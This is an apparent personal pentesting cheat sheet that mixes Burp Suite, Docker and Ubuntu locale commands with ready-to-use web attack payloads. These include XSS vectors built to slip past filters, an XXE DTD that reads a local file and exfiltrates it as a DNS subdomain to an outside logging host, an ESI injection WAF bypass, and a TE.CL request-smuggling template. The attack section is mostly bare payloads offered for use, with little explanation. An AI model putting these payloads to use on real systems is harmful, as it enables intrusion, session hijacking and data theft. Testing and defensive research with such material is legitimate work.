
# ahp_cheatsheet

### Contents
- [Burp Suite Professional](#burp-suite-professional)
- [Docker](#docker)
- [Ubuntu](#ubuntu)
- [Web Applications Security](#web-applications-security)
   + [XSS](#xss) 
   + [XXE](#xxe)
   + [ESI](#esi)
   + [Request Smuggling](#request-smuggling)
- [dev/null](#devnull)

## Burp Suite Professional
### Running own collaborator:  
`java -Xms10m -Xmx200m -XX:GCTimeRatio=19 -jar burp.jar --collaborator-server`

## Docker
### Run from _Dockerfile_ in directory:  
```docker build -t name .```


## Ubuntu
### Setup polish locales
Show locales:  
`locale -a`

Show default locales:  
`cat /etc/default/locale `

Install polish locale:  
`sudo locale-gen pl_PL.utf8`

Setup locales:  
`update-locale LANG=pl_PL.utf8`

## Web Applications Security
### XSS
Some helpful payload caught in the wild
```html
<svG x=1 onload=(co\u006efirm)``//
<embed src=//14.rs>
<marquee loop=1 width=0 onfinish=confirm(1)>
<marquee/onstart=alert(1)>
```

### XXE  
#### Exfiltrate in subdomain name:  
dtd file without .dtd extension _(test.html)_:  
```xml
<!ENTITY % file SYSTEM "file:///etc/flag">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://%file;.b0f4f2d1d89d4ec413ad.d.zhack.ca'>">
%eval;
%exfiltrate;
```  
Injection:
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///tmp/test.html"> %xxe;]>
```  
http://dnsbin.zhack.ca/  
### ESI 
*Edge Side Include Injection*    
WAF'alike bypass:
```html
<svg<!--esi--> onload=aler<!--esi-->t<!--esi-->``
```
```html
he<!--esi-->llo -> hello 
but
he<!--esx-->llo isn't modified 
you have ESI injection
```
```xml
<esi:include src="/anypage.html" dca="none" />
```
 - https://twitter.com/alxbrsn/status/981256374230319112
 - https://t.co/XRxIalWcng?amp=1 
 - https://t.co/vzRIo3RuaR?amp=1
 - https://www.slideshare.net/cisoplatform7/edge-side-include-injection-abusing-caching-servers-into-ssrf-and-transparent-session-hijacking
 
 ### Request Smuggling  
 TE.CL + Hackvertor  
 *(disable “Update Content-Length” in Repeater && “Auto Update Content Length” in Hackvertor Settings)*  
 ```
 POST / HTTP/1.1
Host: abc.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 3

<@chunked_dec2hex_4><@get_var_3 /><@/chunked_dec2hex_4>
<@set_var_1><@length_2>GPOST / HTTP/1.1
Host: abc.com
Content-Length: 15

x=1<@/length_2><@/set_var_1>
0
```

## dev/null
nc permament 'web-server'
```sh
while true; do 
  echo -e "HTTP/1.1 200 OK\n\n $(date)" | nc -l -p 1500 -q 1
done
```
